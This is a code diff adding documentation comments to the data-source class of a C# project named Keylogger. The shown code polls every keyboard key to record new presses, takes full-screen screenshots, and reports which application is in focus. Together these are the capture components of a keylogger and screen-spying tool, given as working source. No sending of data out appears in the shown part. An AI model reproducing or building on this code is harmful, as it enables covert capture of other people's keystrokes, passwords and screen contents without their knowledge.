@@ -11,6 +11,9 @@ using System.Windows.Input;
 
 namespace Keylogger
 {
+    /// <summary>
+    /// This class serves as a data source for keylogger. It provides method to get what we want.
+    /// </summary>
     public class DataSource
     {
         [DllImport("User32.dll")]
@@ -27,17 +30,25 @@ namespace Keylogger
 
 
 
+        /// <summary>
+        /// This functions scans currently pressed keys and returns them. Every key is returned just once. If the key is still pressed during second
+        /// method call, it is not returned. It's returned again after the key is released and pressed again.
+        /// </summary>
+        /// <returns>List of keys which were just pressed</returns>
         public List<Key> GetNewPressedKeys()
         {
             List<Key> newPressedKeys = new List<Key>(10);
 
+            // Get state of every key we know
             foreach (Key key in Utils.GetEnumValues<Key>().Where(x => x != Key.None))
             {
+                // Is it pressed?
                 bool down = Keyboard.IsKeyDown(key);
 
+                // It's not pressed, but it was - we consider this key as released
                 if (!down && PressedKeys.Contains(key))
                     PressedKeys.Remove(key);
-                else if (down && !PressedKeys.Contains(key))
+                else if (down && !PressedKeys.Contains(key)) // The key is pressed, but wasn't pressed before - it will be returned
                 {
                     PressedKeys.Add(key);
                     newPressedKeys.Add(key);
@@ -46,6 +57,11 @@ namespace Keylogger
 
             return newPressedKeys;
         }
+
+        /// <summary>
+        /// Creates snapshot of computer screen and returns its image
+        /// </summary>
+        /// <returns>Image of the screen</returns>
         public Bitmap GetScreenSnapshot()
         {
             Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
@@ -54,6 +70,12 @@ namespace Keylogger
 
             return bitmap;
         }
+
+        /// <summary>
+        /// Search for currently active window (focused) and returns name of the process of that window.
+        /// So if user is using Chrome right now, 'chrome' string will be returned.
+        /// </summary>
+        /// <returns>Name of the process who is tied to currently active window</returns>
         public string GetActiveWindowProcessName()
         {
             IntPtr windowHandle = GetForegroundWindow();
